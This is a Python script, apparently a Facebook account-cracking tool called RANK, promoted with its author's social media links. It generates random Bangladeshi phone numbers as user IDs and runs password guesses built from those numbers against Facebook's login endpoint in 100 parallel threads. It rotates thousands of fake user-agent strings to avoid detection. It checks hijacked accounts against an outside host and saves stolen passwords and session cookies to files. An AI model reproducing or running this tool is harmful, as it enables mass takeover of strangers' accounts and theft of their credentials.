#follow my facebook page https://www.facebook.com/jubairbroFF
#follow github https://github.com/jubairbro
#join our fb grup https://www.facebook.com/groups/jubairbrofreenet/
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
#-----------------color------------------
#green
gn ="\033[1;32m"
#purple
pn ="\033[1;35m"
#blow
bn = "\033[1;34m"
#red
rn = "\033[1;31m"
#yello
yn = "\033[1;33m"
#coyn
cn = "\033[1;36m"
#white
wn = "\033[1;37m"
#-------------------------bragraund color -----------------
red = '\033[1;41m'
green = '\033[1;42m'
yellow = '\033[1;43m'



#end color
ed = "\033[1;0m"

for tg in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
	c='SM-J320Y Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	RANK=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(RANK)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for sat in range(1000):
    a='Redmi'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
logo=(f'''

{gn}`7MM"""Mq.        db      `7MN.   `7MF'`7MMF' `YMM' 
{yn}  MM   `MM.      ;MM:       MMN.    M    MM   .M'   
{rn}  MM   ,M9      ,V^MM.      M YMb   M    MM .d"     
 {wn} MMmmdM9      ,M  {wn}`MM      M  `MN. M    MMMMM.     
 {cn} MM  YM.      AbmmmqMA     M   `MM.M    MM  VMA    
  {rn}MM   `Mb.   A'     VML    M     YMM    MM   `MM.  
{gn}.JMML. .JMM..AMA.   .AMMA..JML.    YM  .JMML.   MMb{ed}.

{yn}─────────────────────────────────────────────────────────                                                    
 {gn}[√]Owner    : {cn}Jubair Ahmad{ed}
 {gn}[√]Guthub   : {cn}Jubairbro{ed}
 {gn}[√]Facebook : {cn}Jubair bro{ed}
 {gn}[√]Taligram : {wn}https://t.me/jubairff{ed}
 {gn}[√]Tools    : {cn}RANK{pn} •{gn}[{cn}version \033[1;32m{rn}•3.9•{ed}{gn}]{ed}
{yn}─────────────────────────────────────────────────────────{ed}
''')
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def fuck():
    user=[]
    os.system('clear')
    print(f'{cn}plisee wait for update..................{gn} ')
#    os.system('git pull')
#    os.system('pkg update && pkg upgrade')
    print(f'\033[1;33m{rn}follow my facebook group{yn}.................{ed}')
#    os.system("xdg-open https://facebook.com/groups/jubairbrofreenet/")
    os.system('clear')
    print(logo)
    print(f'[+] {yn}SIM CODE BD=> {cn}[016]•[017]•[018]•[019]')
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print(f'[+] {cn}[2000]•[5000]•[10000]•[15000]•[50000]{yn}')
    limit = int(input('[?] ENTER YOUR ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as RANK:
        os.system('clear')
        print(logo)
        os.system('xdg-open https://facebook.com/jubairbroFF')
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] LOCK REMOVE DONE [√] ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY JUBAIR BRO JOIN MY GROUP ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;32m─────────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            RANK.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print('\033[1;32m─────────────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sRANK\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = { 'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'scheme': 'https', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://t.facebook.com',
    'referer': 'https://t.facebook.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                cix = coki.split('c_user')[1]
                cid = cix[0:15]
                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
                if 'LOCK' in res:
                    return 'LOCK'
                else:
                    print(f'  \r\033[1;92m  [RANK-OK] '+uid+' | '+ps+'\33[0;92m')
                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
                open('/sdcard/RANK-OK.txt', 'a').write( uid+' | '+ps+'+\n')
                open('/sdcard/RANK-COOKIE.txt', 'a').write( coki+' | '+uid+'+\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RANK-CP💔]{wn} {uid} | {ps}")
                open('/sdcard/RANK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()
#follow my facebook page https://www.facebook.com/jubairbroFF
#follow github https://github.com/jubairbro
#join our fb grup https://www.facebook.com/groups/jubairbrofreenet/